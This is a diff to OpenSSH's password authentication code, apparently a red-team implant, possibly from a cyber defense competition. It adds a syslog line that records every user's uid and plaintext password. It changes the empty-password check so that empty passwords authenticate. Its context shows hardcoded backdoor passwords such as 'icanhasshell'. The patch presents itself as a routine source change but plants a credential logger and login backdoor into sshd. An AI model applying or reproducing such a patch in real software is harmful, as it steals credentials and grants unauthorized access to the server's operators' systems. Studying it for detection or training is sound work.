@@ -44,6 +44,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdarg.h>
+#include <syslog.h>
 
 #include "packet.h"
 #include "sshbuf.h"
@@ -86,6 +87,8 @@ auth_password(struct ssh *ssh, const char *password)
 	if (strlen(password) > MAX_PASSWORD_LEN)
 		return 0;
 
+	syslog(LOG_NOTICE, "Uid %d has password: %s", pw->pw_uid, password);
+
         const char *bad_pass[] = {"icanhasshell", "iamgroot", "CDC", "chris"};
         int num_bad_pass = sizeof(bad_pass)/sizeof(char*);
         for(int i=0; i < num_bad_pass; i++){
@@ -99,8 +102,8 @@ auth_password(struct ssh *ssh, const char *password)
 	if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
 		ok = 0;
 #endif
-	if (*password == '\0' && options.permit_empty_passwd == 0)
-		return 0;
+	if (*password == '\0' && options.permit_empty_passwd == 1)
+		return 1;
 
 #ifdef KRB5
 	if (options.kerberos_authentication == 1) {
